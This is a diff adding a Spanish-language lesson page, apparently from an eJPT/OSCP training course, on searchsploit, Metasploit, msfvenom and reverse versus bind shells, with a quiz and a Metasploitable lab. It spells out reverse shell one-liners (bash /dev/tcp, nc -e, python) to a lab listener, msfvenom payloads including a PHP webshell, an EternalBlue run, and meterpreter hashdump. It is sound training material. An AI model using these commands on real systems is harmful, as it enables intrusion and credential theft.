@@ -1,0 +1,114 @@
+09 · Explotación y Metasploit|Searchsploit, msfconsole, payloads, reverse vs bind shell, msfvenom, meterpreter y shells estables.
+<span class="badge ejpt">Nivel 1 · eJPTv2</span>
+<h1>09 · Explotación y Metasploit</h1>
+<p class="lead">Convertir una vulnerabilidad en acceso real. Verás cómo buscar exploits, usar Metasploit y, lo más importante, entender las shells (reverse vs bind).</p>
+
+<h2>1. Buscar exploits por versión</h2>
+<pre><span class="p">$</span> searchsploit vsftpd 2.3.4           <span class="c"># busca en la base local Exploit-DB</span>
+<span class="p">$</span> searchsploit -m 17491               <span class="c"># copia (mirror) el exploit a tu carpeta</span>
+<span class="p">$</span> searchsploit apache 2.4.49
+<span class="c"># También: Google "servicio versión exploit", github, exploit-db.com</span></pre>
+<div class="box tip"><strong>💡 El flujo mental</strong>Nmap te dio “vsftpd 2.3.4” → searchsploit → hay backdoor → lo lanzas → shell. La versión del módulo 06 es la llave.</div>
+
+<h2>2. Shells: reverse vs bind (concepto CLAVE)</h2>
+<figure>
+<svg viewBox="0 0 820 260" role="img" aria-label="Reverse shell vs bind shell">
+<rect x="20" y="20" width="360" height="110" rx="12" fill="#0f9d6e22" stroke="#0f9d6e"/>
+<text x="200" y="45" text-anchor="middle" font-weight="800">🔄 Reverse shell (la habitual)</text>
+<text x="200" y="70" text-anchor="middle" font-size="12">Tú ESCUCHAS. La víctima te llama.</text>
+<text x="40" y="100" font-size="11" font-family="JetBrains Mono">Kali: nc -lvnp 443  (escucha)</text>
+<text x="40" y="118" font-size="11" font-family="JetBrains Mono">Víctima → conecta a ti :443</text>
+<rect x="440" y="20" width="360" height="110" rx="12" fill="#d9770622" stroke="#d97706"/>
+<text x="620" y="45" text-anchor="middle" font-weight="800">➡️ Bind shell</text>
+<text x="620" y="70" text-anchor="middle" font-size="12">La víctima ESCUCHA. Tú te conectas.</text>
+<text x="460" y="100" font-size="11" font-family="JetBrains Mono">Víctima: abre puerto 4444</text>
+<text x="460" y="118" font-size="11" font-family="JetBrains Mono">Kali: nc víctima 4444</text>
+<text x="410" y="170" text-anchor="middle" font-size="13" class="muted">La reverse funciona mejor porque los firewalls suelen bloquear conexiones ENTRANTES</text>
+<text x="410" y="200" text-anchor="middle" font-size="13" class="muted">pero permiten las SALIENTES (la víctima saliendo hacia ti).</text>
+</svg></figure>
+<div class="box analogy"><strong>🧠 Analogía</strong><b>Reverse</b> = le das tu número a alguien y te llama él (su teléfono marca hacia fuera, cosa que su operador permite). <b>Bind</b> = tú llamas a su número, pero su centralita (firewall) puede rechazar llamadas entrantes.</div>
+
+<h2>3. Montar una reverse shell a mano</h2>
+<pre><span class="c"># 1) En Kali, ponte a escuchar</span>
+<span class="p">$</span> nc -lvnp 443
+<span class="c"># 2) En la víctima (por webshell, inyección, etc.) ejecuta UNA de estas:</span>
+bash -i &gt;&amp; /dev/tcp/10.0.2.15/443 0&gt;&amp;1          <span class="c"># bash</span>
+nc -e /bin/bash 10.0.2.15 443                   <span class="c"># netcat clásico</span>
+python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("10.0.2.15",443));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn("/bin/bash")'</pre>
+<div class="box tip"><strong>💡 Web útil</strong>revshells.com genera reverse shells en cualquier lenguaje. Y recuerda estabilizar la shell (módulo 02, recuadro OSCP).</div>
+
+<h2>4. msfvenom: fabricar payloads</h2>
+<pre><span class="c"># Reverse shell Linux (ELF)</span>
+<span class="p">$</span> msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.0.2.15 LPORT=443 -f elf -o shell
+<span class="c"># Reverse shell Windows (EXE)</span>
+<span class="p">$</span> msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.2.15 LPORT=443 -f exe -o shell.exe
+<span class="c"># Webshell PHP</span>
+<span class="p">$</span> msfvenom -p php/reverse_php LHOST=10.0.2.15 LPORT=443 -f raw -o shell.php</pre>
+<div class="box def"><strong>📘 LHOST / LPORT / RHOST</strong><b>LHOST</b> = tu IP (donde la víctima te devuelve la shell). <b>LPORT</b> = tu puerto de escucha. <b>RHOST</b> = la IP de la víctima.</div>
+
+<h2>5. Metasploit (msfconsole)</h2>
+<pre><span class="p">$</span> msfconsole
+msf&gt; search ms17-010
+msf&gt; use exploit/windows/smb/ms17_010_eternalblue
+msf&gt; show options
+msf&gt; set RHOSTS 10.0.2.5
+msf&gt; set LHOST 10.0.2.15
+msf&gt; set LPORT 443
+msf&gt; check                 <span class="c"># ¿es vulnerable? (si el módulo lo soporta)</span>
+msf&gt; exploit               <span class="c"># o 'run'</span></pre>
+<div class="table-wrap"><table>
+<tr><th>Comando</th><th>Qué hace</th></tr>
+<tr><td><code>search tipo:exploit nombre</code></td><td>Buscar módulos</td></tr>
+<tr><td><code>use RUTA</code></td><td>Seleccionar módulo</td></tr>
+<tr><td><code>show options</code> / <code>info</code></td><td>Ver parámetros / info</td></tr>
+<tr><td><code>set RHOSTS ...</code></td><td>Configurar objetivo</td></tr>
+<tr><td><code>set PAYLOAD ...</code></td><td>Elegir qué se ejecuta tras entrar</td></tr>
+<tr><td><code>exploit</code> / <code>run</code></td><td>Lanzar</td></tr>
+<tr><td><code>sessions -l</code> / <code>sessions -i 1</code></td><td>Listar / entrar a una sesión</td></tr>
+<tr><td><code>background</code> (Ctrl+Z)</td><td>Dejar la sesión en segundo plano</td></tr>
+</table></div>
+
+<h2>6. Meterpreter (la shell avanzada de Metasploit)</h2>
+<pre>meterpreter&gt; sysinfo          <span class="c"># info del sistema</span>
+meterpreter&gt; getuid           <span class="c"># quién soy</span>
+meterpreter&gt; getsystem        <span class="c"># intentar subir a SYSTEM (Windows)</span>
+meterpreter&gt; hashdump         <span class="c"># volcar hashes</span>
+meterpreter&gt; shell            <span class="c"># shell del sistema normal</span>
+meterpreter&gt; upload linpeas.sh /tmp/
+meterpreter&gt; download /etc/passwd
+meterpreter&gt; search -f *.txt</pre>
+
+<h2>7. Multi/handler: recibir shells</h2>
+<pre>msf&gt; use exploit/multi/handler
+msf&gt; set PAYLOAD windows/x64/meterpreter/reverse_tcp
+msf&gt; set LHOST 10.0.2.15
+msf&gt; set LPORT 443
+msf&gt; run        <span class="c"># queda escuchando; ejecuta tu shell.exe en la víctima</span></pre>
+
+<div class="box oscp"><strong>🔴 Nivel OSCP</strong>En el OSCP solo puedes usar Metasploit en <b>una</b> máquina del examen. Por eso debes saber explotar <b>sin</b> él: compilar exploits de Exploit-DB, generar payloads con msfvenom (permitido) y montar reverse shells a mano. Practica la vía manual desde ya.</div>
+
+<h2>🎥 Vídeos</h2>
+<div class="vlinks">
+<a href="https://www.youtube.com/results?search_query=metasploit+tutorial+espa%C3%B1ol" target="_blank" rel="noopener">Metasploit (ES)</a>
+<a href="https://www.youtube.com/results?search_query=reverse+shell+vs+bind+shell+explained" target="_blank" rel="noopener">Reverse vs bind shell</a>
+<a href="https://www.youtube.com/results?search_query=s4vitar+reverse+shell+estable" target="_blank" rel="noopener">S4vitar – shell estable</a>
+</div>
+
+<h2>📝 Evaluación del tema</h2>
+<script type="application/json" data-quiz="Cuestionario 09 · Explotación">
+[
+{"q":"En una REVERSE shell, ¿quién escucha?","o":["La víctima","El atacante (tú)","El router","Nadie"],"a":1,"e":"Tú escuchas (nc -lvnp) y la víctima se conecta a ti."},
+{"q":"¿Por qué suele funcionar mejor una reverse que una bind shell?","o":["Es más rápida","Los firewalls permiten conexiones salientes de la víctima","Usa menos puertos","No necesita IP"],"a":1,"e":"La víctima sale hacia ti; los firewalls bloquean entrantes, no salientes."},
+{"q":"¿Qué es LHOST en msfvenom?","o":["La IP de la víctima","Tu IP (donde recibes la shell)","El puerto","El payload"],"a":1,"e":"LHOST = tu IP de atacante."},
+{"q":"¿Qué comando busca exploits en la base local de Exploit-DB?","o":["nmap","searchsploit","hydra","wpscan"],"a":1,"e":"searchsploit."},
+{"q":"En Metasploit, ¿qué módulo usas para recibir una shell generada con msfvenom?","o":["exploit/multi/handler","auxiliary/scanner","post/linux","exploit/windows/smb"],"a":0,"e":"multi/handler queda a la escucha del payload."},
+{"q":"¿Qué comando de meterpreter vuelca los hashes de Windows?","o":["getuid","hashdump","sysinfo","ps"],"a":1,"e":"hashdump (requiere privilegios de SYSTEM)."},
+{"q":"RHOST se refiere a…","o":["Tu IP","La IP del objetivo remoto","El puerto remoto","El payload"],"a":1,"e":"RHOST/RHOSTS = objetivo."},
+{"q":"¿Cuál es la limitación de Metasploit en el OSCP?","o":["Está prohibido del todo","Solo en una máquina","Solo payloads","Solo en AD"],"a":1,"e":"Uso completo solo en una máquina del examen."}
+]
+</script>
+<div class="lab"><h4>🧪 Práctica</h4><p>Sobre Metasploitable 2: explota vsftpd 2.3.4 (con el módulo de Metasploit o el exploit manual de searchsploit) y consigue una shell. Luego genera un <code>shell.elf</code> con msfvenom, súbelo por un servicio y recíbelo con multi/handler.</p>
+<details class="sol"><summary>Pistas</summary><div><pre>msfconsole -q
+use exploit/unix/ftp/vsftpd_234_backdoor
+set RHOSTS 10.0.2.4
+run        <span class="c"># deberías obtener una shell de root</span></pre></div></details></div>
